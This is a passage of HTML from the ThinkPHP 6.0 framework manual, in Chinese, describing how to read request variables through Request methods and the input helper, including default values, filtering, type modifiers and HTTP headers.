<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_14" target="_blank">&#x68C0;&#x6D4B;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x8BBE;&#x7F6E;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_25" target="_blank">&#x53D8;&#x91CF;&#x83B7;&#x53D6;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_89" target="_blank">&#x9ED8;&#x8BA4;&#x503C;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_101" target="_blank">&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_142" target="_blank">&#x83B7;&#x53D6;&#x90E8;&#x5206;&#x53D8;&#x91CF;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_191" target="_blank">&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_217" target="_blank">&#x4E2D;&#x95F4;&#x4EF6;&#x53D8;&#x91CF;</a></li>
<li><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037519#_239" target="_blank">&#x52A9;&#x624B;&#x51FD;&#x6570;</a></li>
</ul>
<h2 id="&#x68C0;&#x6D4B;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x8BBE;&#x7F6E;">&#x68C0;&#x6D4B;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x8BBE;&#x7F6E;</h2>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>has</code>&#x65B9;&#x6CD5;&#x6765;&#x68C0;&#x6D4B;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x53C2;&#x6570;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Request::has(&apos;id&apos;,&apos;get&apos;);
Request::has(&apos;name&apos;,&apos;post&apos;);
</code></pre><p>&#x53D8;&#x91CF;&#x68C0;&#x6D4B;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x6240;&#x6709;&#x652F;&#x6301;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#xFF0C;&#x5305;&#x62EC;<code>get/post/put/request/cookie/server/session/env/file</code>&#x3002;</p>
<h2 id="&#x53D8;&#x91CF;&#x83B7;&#x53D6;">&#x53D8;&#x91CF;&#x83B7;&#x53D6;</h2>
<p>&#x53D8;&#x91CF;&#x83B7;&#x53D6;&#x4F7F;&#x7528;<code>\think\Request</code>&#x7C7B;&#x7684;&#x5982;&#x4E0B;&#x65B9;&#x6CD5;&#x53CA;&#x53C2;&#x6570;&#xFF1A;</p>
<blockquote>
<h3 id="&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x65B9;&#x6CD5;&#x53D8;&#x91CF;&#x540D;&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;&#x9ED8;&#x8BA4;&#x503C;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;">&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x65B9;&#x6CD5;(&apos;&#x53D8;&#x91CF;&#x540D;/&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;&apos;,&apos;&#x9ED8;&#x8BA4;&#x503C;&apos;,&apos;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&apos;)</h3>
</blockquote>
<p>&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x65B9;&#x6CD5;&#x5305;&#x62EC;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x65B9;&#x6CD5;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">param</td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">get</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_GET &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">post</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_POST &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">put</td>
<td style="text-align:left">&#x83B7;&#x53D6; PUT &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">delete</td>
<td style="text-align:left">&#x83B7;&#x53D6; DELETE &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">session</td>
<td style="text-align:left">&#x83B7;&#x53D6; SESSION &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">cookie</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_COOKIE &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">request</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_REQUEST &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">server</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_SERVER &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">env</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_ENV &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">route</td>
<td style="text-align:left">&#x83B7;&#x53D6; &#x8DEF;&#x7531;&#xFF08;&#x5305;&#x62EC;PATHINFO&#xFF09; &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">middleware</td>
<td style="text-align:left">&#x83B7;&#x53D6; &#x4E2D;&#x95F4;&#x4EF6;&#x8D4B;&#x503C;/&#x4F20;&#x9012;&#x7684;&#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">file</td>
<td style="text-align:left">&#x83B7;&#x53D6; $_FILES &#x53D8;&#x91CF;</td>
</tr>
<tr>
<td style="text-align:left">all <code>V6.0.8+</code></td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x5305;&#x62EC; $_FILES &#x53D8;&#x91CF;&#x5728;&#x5185;&#x7684;&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;param+file</td>
</tr>
</tbody>
</table>
<h3 id="&#x83B7;&#x53D6;param&#x53D8;&#x91CF;">&#x83B7;&#x53D6;<code>PARAM</code>&#x53D8;&#x91CF;</h3>
<p><code>PARAM</code>&#x7C7B;&#x578B;&#x53D8;&#x91CF;&#x662F;&#x6846;&#x67B6;&#x63D0;&#x4F9B;&#x7684;&#x7528;&#x4E8E;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x4E00;&#x79CD;&#x53D8;&#x91CF;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#xFF0C;&#x662F;&#x7CFB;&#x7EDF;&#x63A8;&#x8350;&#x7684;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;name&#x53D8;&#x91CF;
Request::param(&apos;name&apos;);
// &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x6240;&#x6709;&#x53D8;&#x91CF;&#xFF08;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#xFF09;
Request::param();
// &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x672A;&#x7ECF;&#x8FC7;&#x6EE4;&#x7684;&#x6240;&#x6709;&#x53D8;&#x91CF;
Request::param(false);
// &#x83B7;&#x53D6;&#x90E8;&#x5206;&#x53D8;&#x91CF;
Request::param([&apos;name&apos;, &apos;email&apos;]);
</code></pre><blockquote>
<p><code>param</code>&#x65B9;&#x6CD5;&#x4F1A;&#x628A;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x548C;&#x8DEF;&#x7531;&#x53D8;&#x91CF;&#x4EE5;&#x53CA;GET&#x8BF7;&#x6C42;&#x5408;&#x5E76;&#xFF0C;&#x5E76;&#x4E14;&#x8DEF;&#x7531;&#x53D8;&#x91CF;&#x662F;&#x4F18;&#x5148;&#x7684;&#x3002;</p>
</blockquote>
<p>&#x5176;&#x5B83;&#x7684;&#x8F93;&#x5165;&#x53D8;&#x91CF;&#x83B7;&#x53D6;&#x65B9;&#x6CD5;&#x548C;<code>param</code>&#x65B9;&#x6CD5;&#x7528;&#x6CD5;&#x57FA;&#x672C;&#x4E00;&#x81F4;&#x3002;</p>
<p>&#x4F60;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;<strong>get&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x8DEF;&#x7531;&#x53D8;&#x91CF;</strong>&#xFF0C;&#x4F8B;&#x5982;&#x5F53;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x662F;</p>
<pre><code>http://localhost/index.php/index/index/hello/name/thinkphp
</code></pre><p>&#x4E0B;&#x9762;&#x7684;&#x7528;&#x6CD5;&#x662F;&#x9519;&#x8BEF;&#x7684;</p>
<pre><code>echo Request::get(&apos;name&apos;); // &#x8F93;&#x51FA;&#x4E3A;&#x7A7A;
</code></pre><p>&#x6B63;&#x786E;&#x7684;&#x7528;&#x6CD5;&#x662F;</p>
<pre><code>echo Request::param(&apos;name&apos;); // &#x8F93;&#x51FA;thinkphp
</code></pre><blockquote>
<p>&#x9664;&#x4E86;<code>server</code>&#x548C;<code>env</code>&#x65B9;&#x6CD5;&#x7684;&#x53D8;&#x91CF;&#x540D;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF08;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x4E3A;&#x5927;&#x5199;&#x540E;&#x83B7;&#x53D6;&#xFF09;&#xFF0C;&#x5176;&#x5B83;&#x53D8;&#x91CF;&#x540D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#x3002;</p>
</blockquote>
<h2 id="&#x9ED8;&#x8BA4;&#x503C;">&#x9ED8;&#x8BA4;&#x503C;</h2>
<p>&#x83B7;&#x53D6;&#x8F93;&#x5165;&#x53D8;&#x91CF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x4F8B;&#x5982;&#x5F53;URL&#x4E2D;&#x4E0D;&#x5305;&#x542B;<code>$_GET[&apos;name&apos;]</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x6BD4;&#x8F83;&#x3002;</p>
<pre><code>Request::get(&apos;name&apos;); // &#x8FD4;&#x56DE;&#x503C;&#x4E3A;null
Request::get(&apos;name&apos;,&apos;&apos;); // &#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;
Request::get(&apos;name&apos;,&apos;default&apos;); // &#x8FD4;&#x56DE;&#x503C;&#x4E3A;default
</code></pre><p>&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;&#x65B9;&#x6CD5;&#x90FD;&#x652F;&#x6301;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E2D;&#x4F20;&#x5165;&#x9ED8;&#x8BA4;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
<h2 id="&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;">&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;</h2>
<blockquote>
<p>&#x6846;&#x67B6;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x4EFB;&#x4F55;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;<code>app\Request</code>&#x5BF9;&#x8C61;&#x4E2D;&#x8BBE;&#x7F6E;<code>filter</code>&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x5C5E;&#x6027;&#xFF1A;</p>
</blockquote>
<pre><code>namespace app;

class Request extends \think\Request
{
    protected $filter = [&apos;htmlspecialchars&apos;];
}
</code></pre><p>&#x4E5F;&#x652F;&#x6301;&#x4F7F;&#x7528;<code>Request</code>&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x83B7;&#x53D6;&#x8FC7;&#x6EE4;&#xFF0C;&#x8FC7;&#x6EE4;&#x65B9;&#x5F0F;&#x5305;&#x62EC;&#x51FD;&#x6570;&#x3001;&#x65B9;&#x6CD5;&#x8FC7;&#x6EE4;&#xFF0C;&#x4EE5;&#x53CA;PHP&#x5185;&#x7F6E;&#x7684;Types of filters&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&#xFF0C;&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Request::filter([&apos;strip_tags&apos;,&apos;htmlspecialchars&apos;]),
</code></pre><p>&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x83B7;&#x53D6;&#x53D8;&#x91CF;&#x7684;&#x65F6;&#x5019;&#x6DFB;&#x52A0;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Request::get(&apos;name&apos;,&apos;&apos;,&apos;htmlspecialchars&apos;); // &#x83B7;&#x53D6;get&#x53D8;&#x91CF; &#x5E76;&#x7528;htmlspecialchars&#x51FD;&#x6570;&#x8FC7;&#x6EE4;
Request::param(&apos;username&apos;,&apos;&apos;,&apos;strip_tags&apos;); // &#x83B7;&#x53D6;param&#x53D8;&#x91CF; &#x5E76;&#x7528;strip_tags&#x51FD;&#x6570;&#x8FC7;&#x6EE4;
Request::post(&apos;name&apos;,&apos;&apos;,&apos;org\Filter::safeHtml&apos;); // &#x83B7;&#x53D6;post&#x53D8;&#x91CF; &#x5E76;&#x7528;org\Filter&#x7C7B;&#x7684;safeHtml&#x65B9;&#x6CD5;&#x8FC7;&#x6EE4;
</code></pre><p>&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4F20;&#x5165;&#x591A;&#x4E2A;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Request::param(&apos;username&apos;,&apos;&apos;,&apos;strip_tags,strtolower&apos;); // &#x83B7;&#x53D6;param&#x53D8;&#x91CF; &#x5E76;&#x4F9D;&#x6B21;&#x8C03;&#x7528;strip_tags&#x3001;strtolower&#x51FD;&#x6570;&#x8FC7;&#x6EE4;
</code></pre><p>&#x5982;&#x679C;&#x5F53;&#x524D;&#x4E0D;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>// &#x83B7;&#x53D6;get&#x53D8;&#x91CF; &#x5E76;&#x4E14;&#x4E0D;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4; &#x5373;&#x4F7F;&#x8BBE;&#x7F6E;&#x4E86;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;
Request::get(&apos;name&apos;, &apos;&apos;, null);
</code></pre><blockquote>
<p>&#x5BF9;&#x4E8E;body&#x4E2D;&#x63D0;&#x4EA4;&#x7684;<code>json</code>&#x5BF9;&#x8C61;&#xFF0C;&#x4F60;&#x65E0;&#x9700;&#x4F7F;&#x7528;<code>php://input</code>&#x53BB;&#x83B7;&#x53D6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5F53;&#x505A;&#x8868;&#x5355;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x7CFB;&#x7EDF;&#x5DF2;&#x7ECF;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x8FC7;&#x4E86;</p>
</blockquote>
<h2 id="&#x83B7;&#x53D6;&#x90E8;&#x5206;&#x53D8;&#x91CF;">&#x83B7;&#x53D6;&#x90E8;&#x5206;&#x53D8;&#x91CF;</h2>
<p>&#x5982;&#x679C;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x90E8;&#x5206;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>// &#x53EA;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;id&#x548C;name&#x53D8;&#x91CF;
Request::only([&apos;id&apos;,&apos;name&apos;]);
</code></pre><blockquote>
<p>&#x91C7;&#x7528;<code>only</code>&#x65B9;&#x6CD5;&#x80FD;&#x591F;&#x5B89;&#x5168;&#x7684;&#x83B7;&#x53D6;&#x4F60;&#x9700;&#x8981;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x907F;&#x514D;&#x989D;&#x5916;&#x53D8;&#x91CF;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x5904;&#x7406;&#x548C;&#x5199;&#x5165;&#x3002;</p>
</blockquote>
<p><code>only</code>&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x6279;&#x91CF;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// &#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;
Request::only([&apos;id&apos;=&gt;0,&apos;name&apos;=&gt;&apos;&apos;]);
</code></pre><p>&#x8868;&#x793A;<code>id</code>&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;0&#xFF0C;<code>name</code>&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x83B7;&#x53D6;&#x7684;&#x662F;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#xFF08;<code>PARAM</code>&#x7C7B;&#x578B;&#x53D8;&#x91CF;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x5176;&#x5B83;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4F20;&#x5165;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x53EA;&#x83B7;&#x53D6;GET&#x8BF7;&#x6C42;&#x7684;id&#x548C;name&#x53D8;&#x91CF;
Request::only([&apos;id&apos;,&apos;name&apos;], &apos;get&apos;);
// &#x7B49;&#x6548;&#x4E8E;
Request::get([&apos;id&apos;, &apos;name&apos;]);
// &#x53EA;&#x83B7;&#x53D6;POST&#x8BF7;&#x6C42;&#x7684;id&#x548C;name&#x53D8;&#x91CF;
Request::only([&apos;id&apos;,&apos;name&apos;], &apos;post&apos;);
// &#x7B49;&#x6548;&#x4E8E;
Request::post([&apos;id&apos;, &apos;name&apos;]);
</code></pre><p>&#x4E5F;&#x652F;&#x6301;&#x6392;&#x9664;&#x67D0;&#x4E9B;&#x53D8;&#x91CF;&#x540E;&#x83B7;&#x53D6;&#xFF0C;&#x4F8B;&#x5982;</p>
<pre><code>// &#x6392;&#x9664;id&#x548C;name&#x53D8;&#x91CF;
Request::except([&apos;id&apos;,&apos;name&apos;]);
</code></pre><p>&#x540C;&#x6837;&#x652F;&#x6301;&#x6307;&#x5B9A;&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x83B7;&#x53D6;&#xFF1A;</p>
<pre><code>// &#x6392;&#x9664;GET&#x8BF7;&#x6C42;&#x7684;id&#x548C;name&#x53D8;&#x91CF;
Request::except([&apos;id&apos;,&apos;name&apos;], &apos;get&apos;);
// &#x6392;&#x9664;POST&#x8BF7;&#x6C42;&#x7684;id&#x548C;name&#x53D8;&#x91CF;
Request::except([&apos;id&apos;,&apos;name&apos;], &apos;post&apos;);
</code></pre><h2 id="&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;">&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;</h2>
<p>&#x652F;&#x6301;&#x5BF9;&#x53D8;&#x91CF;&#x4F7F;&#x7528;&#x4FEE;&#x9970;&#x7B26;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x7B80;&#x5355;&#x8FC7;&#x6EE4;&#x53D8;&#x91CF;&#xFF0C;&#x66F4;&#x4E3A;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x8BF7;&#x4F7F;&#x7528;&#x524D;&#x9762;&#x63D0;&#x8FC7;&#x7684;&#x53D8;&#x91CF;&#x8FC7;&#x6EE4;&#x529F;&#x80FD;&#x3002;</p>
<p>&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<blockquote>
<h3 id="request&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x53D8;&#x91CF;&#x540D;&#x4FEE;&#x9970;&#x7B26;">Request::&#x53D8;&#x91CF;&#x7C7B;&#x578B;(&apos;&#x53D8;&#x91CF;&#x540D;/&#x4FEE;&#x9970;&#x7B26;&apos;);</h3>
</blockquote>
<p>&#x652F;&#x6301;&#x7684;&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x4FEE;&#x9970;&#x7B26;</th>
<th style="text-align:left">&#x4F5C;&#x7528;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">s</td>
<td style="text-align:left">&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">d</td>
<td style="text-align:left">&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A;&#x6574;&#x578B;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A;&#x5E03;&#x5C14;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">a</td>
<td style="text-align:left">&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x7EC4;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A;&#x6D6E;&#x70B9;&#x7C7B;&#x578B;</td>
</tr>
</tbody>
</table>
<p>&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E9B;&#x4F8B;&#x5B50;&#xFF1A;</p>
<pre><code>Request::get(&apos;id/d&apos;);
Request::post(&apos;name/s&apos;);
Request::post(&apos;ids/a&apos;);
</code></pre><h2 id="&#x4E2D;&#x95F4;&#x4EF6;&#x53D8;&#x91CF;">&#x4E2D;&#x95F4;&#x4EF6;&#x53D8;&#x91CF;</h2>
<p>&#x53EF;&#x4EE5;&#x5728;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x8BBE;&#x7F6E;&#x548C;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x53D8;&#x91CF;&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x7684;&#x6539;&#x53D8;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;<code>PARAM</code>&#x53D8;&#x91CF;&#x7684;&#x83B7;&#x53D6;&#x3002;</p>
<pre><code>&lt;?php

namespace app\http\middleware;

class Check
{
    public function handle($request, \Closure $next)
    {
        if (&apos;think&apos; == $request-&gt;name) {
            $request-&gt;name = &apos;ThinkPHP&apos;;
        }

        return $next($request);
    }
}
</code></pre><h4 id="&#x52A9;&#x624B;&#x51FD;&#x6570;">&#x52A9;&#x624B;&#x51FD;&#x6570;</h4>
<p>&#x4E3A;&#x4E86;&#x7B80;&#x5316;&#x4F7F;&#x7528;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x7684;<code>input</code>&#x52A9;&#x624B;&#x51FD;&#x6570;&#x5B8C;&#x6210;&#x4E0A;&#x8FF0;&#x5927;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x3002;</p>
<p>&#x5224;&#x65AD;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x5B9A;&#x4E49;</p>
<pre><code>input(&apos;?get.id&apos;);
input(&apos;?post.name&apos;);
</code></pre><p>&#x83B7;&#x53D6;PARAM&#x53C2;&#x6570;</p>
<pre><code>input(&apos;param.name&apos;); // &#x83B7;&#x53D6;&#x5355;&#x4E2A;&#x53C2;&#x6570;
input(&apos;param.&apos;); // &#x83B7;&#x53D6;&#x5168;&#x90E8;&#x53C2;&#x6570;
// &#x4E0B;&#x9762;&#x662F;&#x7B49;&#x6548;&#x7684;
input(&apos;name&apos;); 
input(&apos;&apos;);
</code></pre><p>&#x83B7;&#x53D6;GET&#x53C2;&#x6570;</p>
<pre><code>// &#x83B7;&#x53D6;&#x5355;&#x4E2A;&#x53D8;&#x91CF;
input(&apos;get.id&apos;);
// &#x4F7F;&#x7528;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;&#x83B7;&#x53D6; &#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;
input(&apos;get.name&apos;);
// &#x83B7;&#x53D6;&#x5168;&#x90E8;&#x53D8;&#x91CF;
input(&apos;get.&apos;);
</code></pre><p>&#x4F7F;&#x7528;&#x8FC7;&#x6EE4;&#x65B9;&#x6CD5;</p>
<pre><code>input(&apos;get.name&apos;,&apos;&apos;,&apos;htmlspecialchars&apos;); // &#x83B7;&#x53D6;get&#x53D8;&#x91CF; &#x5E76;&#x7528;htmlspecialchars&#x51FD;&#x6570;&#x8FC7;&#x6EE4;
input(&apos;username&apos;,&apos;&apos;,&apos;strip_tags&apos;); // &#x83B7;&#x53D6;param&#x53D8;&#x91CF; &#x5E76;&#x7528;strip_tags&#x51FD;&#x6570;&#x8FC7;&#x6EE4;
input(&apos;post.name&apos;,&apos;&apos;,&apos;org\Filter::safeHtml&apos;); // &#x83B7;&#x53D6;post&#x53D8;&#x91CF; &#x5E76;&#x7528;org\Filter&#x7C7B;&#x7684;safeHtml&#x65B9;&#x6CD5;&#x8FC7;&#x6EE4;
</code></pre><p>&#x4F7F;&#x7528;&#x53D8;&#x91CF;&#x4FEE;&#x9970;&#x7B26;</p>
<pre><code>input(&apos;get.id/d&apos;);
input(&apos;post.name/s&apos;);
input(&apos;post.ids/a&apos;);
</code></pre><p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>Request</code>&#x5BF9;&#x8C61;&#x7684;<code>header</code>&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;<code>HTTP</code>&#x8BF7;&#x6C42;&#x5934;&#x4FE1;&#x606F;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>$info = Request::header();
echo $info[&apos;accept&apos;];
echo $info[&apos;accept-encoding&apos;];
echo $info[&apos;user-agent&apos;];
</code></pre><p>&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x67D0;&#x4E2A;&#x8BF7;&#x6C42;&#x5934;&#x4FE1;&#x606F;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>$agent = Request::header(&apos;user-agent&apos;);
</code></pre><p><code>HTTP</code>&#x8BF7;&#x6C42;&#x5934;&#x4FE1;&#x606F;&#x7684;&#x540D;&#x79F0;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5E76;&#x4E14;<code>_</code>&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x6362;&#x4E3A;<code>-</code>&#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x9762;&#x7684;&#x5199;&#x6CD5;&#x90FD;&#x662F;&#x7B49;&#x6548;&#x7684;&#xFF1A;</p>
<pre><code>$agent = Request::header(&apos;user-agent&apos;);
$agent = Request::header(&apos;USER_AGENT&apos;);
</code></pre><h2 id="&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;">&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;</h2>
